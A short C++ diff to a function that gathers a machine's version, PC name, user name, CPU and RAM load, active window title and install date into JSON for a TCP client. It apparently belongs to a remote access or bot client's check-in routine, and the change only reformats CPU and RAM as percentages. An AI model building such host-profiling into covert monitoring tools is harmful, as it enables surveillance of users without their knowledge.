@@ -15,8 +15,8 @@ bool GetInfo(TcpIP Client)
     j["VER"] = Version;
     j["PCNAME"] = su.GetPCName();
     j["USERNAME"] = su.GetCurrentUser();
-    j["CPU"] = to_string(su.getCPUload());
-    j["RAM"] = to_string(su.GetRAMperc());
+    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
+    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
 	j["ACTWIN"] = wu.GetWindowTitle();
 	j["INSTDATE"] = "TODO";
 
